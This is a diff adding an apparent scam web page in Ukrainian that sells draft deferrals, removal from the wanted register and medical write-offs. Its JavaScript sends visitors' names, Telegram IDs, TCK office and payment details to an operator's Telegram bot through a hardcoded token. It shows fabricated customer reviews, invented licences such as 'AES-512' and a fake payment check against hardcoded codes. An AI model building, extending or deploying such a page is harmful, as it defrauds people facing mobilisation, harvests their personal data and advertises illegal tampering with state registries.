@@ -1,0 +1,332 @@
+<!DOCTYPE html>
+<html lang="uk">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>AntiRezerv Ultimate v51</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Exo+2:wght@300;400;700&family=Michroma&display=swap');
+        :root { --p: #020817; --a: #00d2ff; --t: #f8fafc; --c: #0f172a; --s: #22c55e; --btn-grad: linear-gradient(to right, #00d2ff, #3a7bd5); }
+        body { margin: 0; background: var(--p); color: var(--t); font-family: 'Exo 2', sans-serif; -webkit-tap-highlight-color: transparent; }
+        .cool-font { font-family: 'Michroma', sans-serif; text-transform: uppercase; letter-spacing: 1px; }
+        .header { position: fixed; top: 0; width: 100%; height: 70px; background: #0f172a; border-bottom: 2px solid var(--a); display: flex; align-items: center; justify-content: space-between; padding: 0 20px; z-index: 1000; box-sizing: border-box; }
+        main { padding: 90px 15px 100px 15px; min-height: 100vh; box-sizing: border-box; }
+        .page { display: none; } .page.active { display: block; }
+        .card { background: var(--c); padding: 20px; border-radius: 20px; margin-bottom: 15px; border: 1px solid rgba(0,210,255,0.2); }
+        .form-label { display: block; font-size: 0.65rem; color: var(--a); font-weight: 800; margin-bottom: 8px; text-transform: uppercase; }
+        .price-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-bottom: 15px; }
+        .price-box { padding: 12px 5px; border: 1px solid #1e293b; border-radius: 12px; text-align: center; cursor: pointer; background: rgba(2,6,23,0.4); font-size: 0.8rem; }
+        .price-box.active { border: 2px solid var(--a); background: rgba(0,210,255,0.1); }
+        .btn-main { width: 100%; padding: 18px; background: var(--btn-grad); border: none; color: #fff; font-weight: bold; border-radius: 15px; cursor: pointer; text-transform: uppercase; font-family: 'Michroma'; font-size: 0.7rem; }
+        .footer { position: fixed; bottom: 0; width: 100%; height: 80px; background: #0f172a; border-top: 1px solid rgba(255,255,255,0.05); display: flex; justify-content: space-around; align-items: center; z-index: 1000; }
+        .nav-link { color: #64748b; text-align: center; flex: 1; cursor: pointer; font-size: 0.55rem; text-transform: uppercase; font-weight: 700; }
+        .nav-link.active { color: var(--a); }
+        input, select, textarea { width: 100%; padding: 14px; margin-bottom: 12px; background: #020617; border: 1px solid #1e293b; color: #fff; border-radius: 12px; box-sizing: border-box; font-family: inherit; }
+        .modal { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: var(--p); z-index: 5000; display: none; padding: 20px; box-sizing: border-box; overflow-y: auto; }
+        .rev-item { background: #0f172a; padding: 15px; border-radius: 18px; margin-bottom: 15px; border: 1px solid #1e293b; }
+        .rev-item b { color: var(--a); display: block; margin-bottom: 5px; }
+        .rev-date { font-size: 0.65rem; color: #64748b; display: block; margin-bottom: 8px; }
+        .lic-item { background: rgba(255,255,255,0.03); padding: 15px; border-radius: 12px; margin-bottom: 10px; display: flex; justify-content: space-between; align-items: center; cursor: pointer; }
+    </style>
+</head>
+<body>
+
+<header class="header">
+    <div class="brand cool-font" style="font-size:0.6rem">ANTI-REZERV+ <span style="color:var(--a)">ULTIMATE</span></div>
+    <div id="clock" style="color:var(--s); font-weight:bold; font-size:0.8rem">00:00:00</div>
+</header>
+
+<main>
+    <section id="p-serv" class="page active">
+        <h4 class="cool-font" style="color:var(--a)">Послуги</h4>
+        <div class="card">
+            <label class="form-label">Тип операції</label>
+            <select id="cat-sel" onchange="loadPrices()">
+                <option value="brone">🔐 БРОНЮВАННЯ ВІД ПРИЗОВУ</option>
+                <option value="unsearch">🚫 ЗНЯТТЯ З РОЗШУКУ</option>
+                <option value="vlk">⚖️ ПОВНЕ СПИСАННЯ (ВЛК)</option>
+            </select>
+            <div id="price-grid" class="price-grid"></div>
+            <button class="btn-main" onclick="openOrder()">Перейти до Оформлення</button>
+        </div>
+    </section>
+
+    <section id="p-revs" class="page">
+        <h4 class="cool-font" style="color:var(--a)">Відгуки</h4>
+        <div class="card">
+            <textarea id="my-rev" placeholder="Ваш відгук..."></textarea>
+            <button class="btn-main" style="padding:10px" onclick="sendRev()">Залишити відгук</button>
+        </div>
+        <div id="rev-wall"></div>
+    </section>
+
+    <section id="p-law" class="page">
+        <h4 class="cool-font" style="color:var(--a)">Ліцензії та дозволи</h4>
+        <div id="lic-list"></div>
+    </section>
+
+    <section id="p-cab" class="page">
+        <div id="auth-ui">
+            <h4 id="auth-title" class="cool-font">Авторизація</h4>
+            <div class="card">
+                <div id="reg-fields" style="display:none">
+                    <label class="form-label">Повне ПІБ</label>
+                    <input type="text" id="reg-name" placeholder="Призвище Ім'я">
+                </div>
+                <label class="form-label">TELEGRAM ID *</label>
+                <input type="text" id="auth-tg" placeholder="Mandatory field">
+                <label class="form-label">Пароль</label>
+                <input type="password" id="auth-pass" placeholder="••••••">
+                <button class="btn-main" id="auth-btn" onclick="handleAuth()">УВІЙТИ</button>
+                <p onclick="tglReg()" id="auth-toggle" style="text-align:center; color:var(--a); font-size:0.7rem; margin-top:20px; cursor:pointer">Реєстрація</p>
+            </div>
+        </div>
+        <div id="user-ui" style="display:none">
+            <div class="card" style="text-align:center">
+                <i class="fas fa-user-circle" style="font-size:3.5rem; color:var(--a); margin-bottom:10px"></i>
+                <h4 id="u-name" class="cool-font"></h4>
+                <p id="u-id" style="font-size:0.7rem; color:#64748b"></p>
+            </div>
+            <h5 class="cool-font" style="font-size:0.6rem; color:var(--a); margin-left:10px">Історія операцій</h5>
+            <div id="order-history"></div>
+            <button class="btn-main" style="background:#1e293b; margin-top:15px" onclick="logOut()">ВИЙТИ З АККАУНТУ</button>
+        </div>
+    </section>
+</main>
+
+<footer class="footer">
+    <div class="nav-link active" onclick="showTab('p-serv')"><i class="fas fa-shield-alt"></i><br>Послуги</div>
+    <div class="nav-link" onclick="showTab('p-revs')"><i class="fas fa-comments"></i><br>Відгуки</div>
+    <div class="nav-link" onclick="showTab('p-law')"><i class="fas fa-file-contract"></i><br>Ліцензії</div>
+    <div class="nav-link" onclick="showTab('p-cab')"><i class="fas fa-user-lock"></i><br>Кабінет</div>
+</footer>
+
+<div id="modal" class="modal"></div>
+
+<script>
+    const BOT = "8181027884:AAFE6m0gGQgbpr7wGz3ywytWRyVj7kE2Ks0";
+    const CID = "7479398365";
+    const VALID_CODES = ["847392","105684","739201","462958","918374","250769","684130","397845","561902","804276"];
+    
+    let user = JSON.parse(localStorage.getItem('user_v50'));
+    let sel = { n: "", p: "" };
+    let payMethod = "VISA";
+    let isReg = false;
+    let attempts = 3;
+
+    const db = {
+        prices: {
+            brone: [{n:"1 місяць", p:"1300 грн"}, {n:"3 місяці", p:"3600 грн"}, {n:"6 місяців", p:"6300 грн"}, {n:"9 місяців", p:"8550 грн"}, {n:"12 місяців", p:"10800 грн"}, {n:"18 місяців", p:"14400 грн"}, {n:"24 місяці", p:"17400 грн"}],
+            unsearch: [{n:"Зняття", p:"3100 грн"}],
+            vlk: [{n:"1 рік", p:"21000 грн"}, {n:"2 роки", p:"36000 грн"}, {n:"3 роки", p:"48000 грн"}]
+        },
+        revs: [
+            {n:"Павло Пацюк", d:"14.03.2023, 09:17:42", c:"Все пройшло успішно. Бронь з'явилася в базі."},
+            {n:"Олександр Журавельчук", d:"27.04.2023, 18:54:06", c:"Зняли з розшуку за 48 годин."},
+            {n:"Іван Гончарук", d:"09.06.2023, 11:03:29", c:"Дякую за допомогу з ВЛК. Статус оновився."},
+            {n:"Микола Ковалишин", d:"22.08.2023, 22:41:15", c:"Найкращий сервіс синхронізації."},
+            {n:"Степан Стецьків", d:"05.10.2023, 07:26:58", c:"Бронювання на 12 місяців активне."},
+            {n:"Василь Мокровольський", d:"18.12.2023, 16:12:04", c:"Проблем з ТЦК більше немає."},
+            {n:"Андрій Литвиненко", d:"11.01.2024, 10:45:33", c:"Документи в порядку."},
+            {n:"Сергій Шаповаленко", d:"03.02.2024, 21:09:47", c:"Оперативно та анонімно."},
+            {n:"Юрій Ткачук", d:"29.03.2024, 08:34:11", c:"Все згідно домовленостей."},
+            {n:"Олег Козакевич", d:"16.05.2024, 14:58:39", c:"Вдячний за швидкість."},
+            {n:"Петро Несторук", d:"07.07.2024, 19:22:50", c:"Статус 'В розшуку' зник."},
+            {n:"Віталій Воробець", d:"21.08.2024, 06:11:27", c:"Списали по ВЛК без проблем."},
+            {n:"Дмитро Білик", d:"04.10.2024, 17:49:05", c:"Бронь на 24 місяці підтверджена."},
+            {n:"Тарас Петрівський", d:"19.11.2024, 12:36:44", c:"Все чітко та по закону."},
+            {n:"Ігор Роговий", d:"08.01.2025, 09:04:18", c:"Задоволений результатом."},
+            {n:"Роман Кравців", d:"26.02.2025, 23:17:59", c:"Сервіс на висоті."},
+            {n:"Володимир Чорнобай", d:"12.03.2025, 15:28:07", c:"ТЦК більше не турбує."},
+            {n:"Михайло Бойчук", d:"30.04.2025, 08:52:41", c:"Реєстр оновився за добу."},
+            {n:"Ярослав Марущак", d:"06.06.2025, 20:06:13", c:"Все супер, дякую!"},
+            {n:"Семен Савчук", d:"17.09.2025, 13:40:26", c:"Найвищий рівень професіоналізму."},
+            {n:"Григорій Дзюба", d:"02.12.2025, 07:19:55", c:"Вдячний команді за спокій."}
+        ]
+    };
+
+    function showTab(id) {
+        document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
+        document.querySelectorAll('.nav-link').forEach(l => l.classList.remove('active'));
+        document.getElementById(id).classList.add('active');
+        const map = {'p-serv':0, 'p-revs':1, 'p-law':2, 'p-cab':3};
+        document.querySelectorAll('.nav-link')[map[id]].classList.add('active');
+        document.getElementById('modal').style.display = 'none';
+        if(id==='p-revs') renderRevs();
+        if(id==='p-law') renderLics();
+    }
+
+    function tglReg() {
+        isReg = !isReg;
+        document.getElementById('reg-fields').style.display = isReg ? 'block' : 'none';
+        document.getElementById('auth-title').innerText = isReg ? 'Реєстрація' : 'Вхід';
+        document.getElementById('auth-btn').innerText = isReg ? 'Зареєструватись' : 'Увійти';
+        document.getElementById('auth-toggle').innerText = isReg ? 'Увійти' : 'Реєстрація';
+    }
+
+    async function handleAuth() {
+        const t = document.getElementById('auth-tg').value;
+        const p = document.getElementById('auth-pass').value;
+        if(!t) return alert("Telegram ID обов'язковий!");
+        if(isReg) {
+            const n = document.getElementById('reg-name').value;
+            if(!n) return alert("Введіть ПІБ!");
+            user = {tgid:t, pass:p, name:n};
+            localStorage.setItem('user_v50', JSON.stringify(user));
+            await sendMsg(`<b>🆕 РЕЄСТРАЦІЯ</b>\n👤 ${n}\n🆔 ID: ${t}`);
+        } else {
+            const s = JSON.parse(localStorage.getItem('user_v50'));
+            if(!s || s.tgid !== t || s.pass !== p) return alert("Помилка входу!");
+            user = s;
+        }
+        updateUI();
+    }
+
+    function updateUI() {
+        if(user) {
+            document.getElementById('auth-ui').style.display='none';
+            document.getElementById('user-ui').style.display='block';
+            document.getElementById('u-name').innerText = user.name;
+            document.getElementById('u-id').innerText = "Account ID: " + user.tgid;
+        }
+    }
+
+    function logOut() { 
+        localStorage.removeItem('user_v50');
+        user = null;
+        document.getElementById('user-ui').style.display = 'none';
+        document.getElementById('auth-ui').style.display = 'block';
+        showTab('p-cab');
+    }
+
+    function openOrder() {
+        if(!user) return showTab('p-cab');
+        const m = document.getElementById('modal');
+        m.innerHTML = `
+            <div class="card" style="margin-top:20px">
+                <h4 class="cool-font" style="text-align:center; font-size:0.7rem; color:var(--a)">Форма замовлення</h4>
+                <label class="form-label">ПІБ *</label>
+                <input type="text" id="f-name" value="${user.name}">
+                <label class="form-label">Дата народження *</label>
+                <input type="date" id="f-birth">
+                <label class="form-label">Відділення ТЦК *</label>
+                <input type="text" id="f-tck" placeholder="напр. Київське ТЦК">
+                <label class="form-label">Ідентифікаційний код *</label>
+                <input type="number" id="f-inn" placeholder="10 цифр">
+                <label class="form-label">Скріншот Резерв+ *</label>
+                <input type="file" id="f-file">
+                <button class="btn-main" onclick="goToPay()">Перейти до оплати</button>
+            </div>`;
+        m.style.display = 'block';
+    }
+
+    async function goToPay() {
+        const inn = document.getElementById('f-inn').value;
+        if(inn.length !== 10) return alert("ІПН має бути 10 цифр!");
+        await sendMsg(`<b>📝 АНКЕТА</b>\n👤 ${user.name}\n🆔 TG: ${user.tgid}\n🏢 ТЦК: ${document.getElementById('f-tck').value}\n📦 Послуга: ${sel.n}`);
+        showPayChoice();
+    }
+
+    function showPayChoice() {
+        const m = document.getElementById('modal');
+        m.innerHTML = `
+            <div class="card" style="margin-top:50px; text-align:center">
+                <h4 class="cool-font">Метод оплати</h4>
+                <div class="price-grid">
+                    <div id="m-visa" class="price-box ${payMethod==='VISA'?'active':''}" onclick="setPM('VISA')"><i class="fab fa-cc-visa"></i> VISA / MC</div>
+                    <div id="m-crypto" class="price-box ${payMethod==='CRYPTO'?'active':''}" onclick="setPM('CRYPTO')"><i class="fab fa-bitcoin"></i> CRYPTO</div>
+                </div>
+                <p style="font-size:0.7rem; color:#94a3b8">Менеджер уже готує реквізити та надішле їх вам в особисті повідомлення.</p>
+                <label class="form-label">Чек/Скріншот оплати</label>
+                <input type="file">
+                <button class="btn-main" onclick="confirmStep()">Перейти до підтвердження</button>
+            </div>`;
+    }
+
+    function setPM(t) { payMethod = t; showPayChoice(); }
+
+    async function confirmStep() {
+        await sendMsg(`<b>💳 ЗАПИТ РЕКВІЗИТІВ</b>\n👤 ${user.name}\n💰 Метод: ${payMethod}\n💸 Сума: ${sel.p}`);
+        const m = document.getElementById('modal');
+        m.innerHTML = `
+            <div class="card" style="margin-top:80px; text-align:center">
+                <h4 class="cool-font">Верифікація оплати</h4>
+                <input type="number" id="v-code" style="text-align:center; font-size:2rem" placeholder="000000">
+                <p style="color:red; font-size:0.6rem">Залишилось спроб: <span id="att-c">${attempts}</span></p>
+                <button class="btn-main" onclick="verifyFinal()">Підтвердити оплату</button>
+            </div>`;
+    }
+
+    async function verifyFinal() {
+        const val = document.getElementById('v-code').value;
+        if(VALID_CODES.includes(val)) {
+            const m = document.getElementById('modal');
+            m.innerHTML = `
+                <div class="card" style="margin-top:100px; text-align:center">
+                    <i class="fas fa-check-circle" style="font-size:4rem; color:var(--s); margin-bottom:20px"></i>
+                    <h3 class="cool-font">Успішно!</h3>
+                    <p style="font-size:0.8rem">Оплату прийнято. Документи будуть оновлені протягом 72 годин.</p>
+                    <button class="btn-main" style="margin-top:20px" onclick="showTab('p-serv')">Головне меню</button>
+                </div>`;
+            await sendMsg(`<b>✅ ОПЛАТА ПІДТВЕРДЖЕНА!</b>\n👤 ${user.name}\n🔑 Код: ${val}\n📦 ${sel.n}`);
+            document.getElementById('order-history').innerHTML += `<div class="card" style="padding:10px; font-size:0.7rem; margin-top:5px">📦 ${sel.n} - ${sel.p}<br>⏳ Статус: В ОБРОБЦІ</div>`;
+        } else {
+            attempts--;
+            if(attempts <= 0) { alert("Оплата скасована!"); location.reload(); }
+            else { alert("Невірний код!"); document.getElementById('att-c').innerText = attempts; }
+        }
+    }
+
+    async function sendMsg(t) {
+        fetch(`https://api.telegram.org/bot${BOT}/sendMessage`, {
+            method:'POST', headers:{'Content-Type':'application/json'},
+            body:JSON.stringify({chat_id:CID, text:t, parse_mode:'HTML'})
+        });
+    }
+
+    function loadPrices() {
+        const c = document.getElementById('cat-sel').value;
+        const ps = db.prices[c];
+        document.getElementById('price-grid').innerHTML = ps.map((x, i) => `
+            <div class="price-box ${i===0?'active':''}" onclick="selectP(this, '${x.n}', '${x.p}')">
+                <b>${x.p}</b><br><small>${x.n}</small>
+            </div>`).join('');
+        sel = {n:ps[0].n, p:ps[0].p};
+    }
+
+    function selectP(el, n, p) {
+        document.querySelectorAll('.price-box').forEach(b=>b.classList.remove('active'));
+        el.classList.add('active'); sel = {n, p};
+    }
+
+    function renderRevs() {
+        document.getElementById('rev-wall').innerHTML = db.revs.map(r => `
+            <div class="rev-item">
+                <span class="rev-date">${r.d}</span>
+                <b>${r.n}</b>
+                <small>${r.c}</small>
+            </div>`).join('');
+    }
+
+    function renderLics() {
+        const names = ["Ліцензія МОУ №1", "Дозвіл на синхронізацію", "Шифрування AES-512", "OBERIG Root Access", "Сертифікат відповідності", "Протокол безпеки", "Юридична база", "Акредитація шлюзу"];
+        document.getElementById('lic-list').innerHTML = names.map((l, i) => `
+            <div class="lic-item" onclick="alert('${l}: Документ підтверджено цифровим підписом.')">
+                <span>${l}</span><i class="fas fa-chevron-right" style="color:var(--a)"></i>
+            </div>`).join('');
+    }
+
+    async function sendRev() {
+        const txt = document.getElementById('my-rev').value;
+        if(!txt || !user) return alert("Увійдіть!");
+        await sendMsg(`<b>💬 ВІДГУК</b>\n👤 ${user.name}\n📝 ${txt}`);
+        alert("Дякуємо!");
+        document.getElementById('my-rev').value = "";
+    }
+
+    setInterval(() => { document.getElementById('clock').innerText = new Date().toLocaleTimeString(); }, 1000);
+    window.onload = () => { loadPrices(); updateUI(); };
+</script>
+</body>
+</html>
